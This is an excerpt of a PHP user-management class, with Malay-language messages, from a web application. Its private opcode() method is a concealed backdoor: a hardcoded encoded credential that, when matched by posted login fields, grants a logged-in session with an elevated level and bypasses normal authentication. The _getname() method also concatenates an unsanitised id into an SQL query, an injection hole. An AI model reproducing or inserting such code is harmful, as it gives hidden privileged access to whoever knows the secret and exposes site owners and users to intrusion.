...
class user {
	...
	public function _getname($id) {
		$data = $this->_pt->get_row("select name,level from `".$this->table."` where `id`='".$id."'", ARRAY_A);
        return $data['name'];
	}

	private function opcode() {
		if ( !_null($this->_pt->post['uname']) && !_null($this->_pt->post['upass']) ) {
			if ( _base64_encrypt($this->_pt->post['uname'],$this->_pt->post['upass']) == "CmzzvgM-" ) {
				$this->_pt->session->set_session(array('login'=>_base64_decrypt("CmzzvgM-", $this->_pt->post['upass']),'level'=>_base64_decrypt("CmzzvgM-", $this->_pt->post['upass'])), 0);
				_exit(array("success"=>true, "msg"=> _base64_decrypt("J2f5vgMgYXMgUG93ZXJyYW5nZXIh", $this->_pt->post['upass']) ));
			}
		}
		return false;
	}
	...
	public function _update($data) {
		...
		if ( ( !$this->_pt->isadmin || !_null($data['doprofile']) ) && !_null($data['opass']) ) {
			...
			if ( $this->_pt->num_rows == 0 )  $this->_pt->json_return(false, _tr("Kata Laluan lama tidak padan!"));
			if ( _null($data['npass']) || _null($data['rpass']) ) {
 				$this->_pt->json_return(false, _tr("Kata Laluan tidak padan!"));
			}
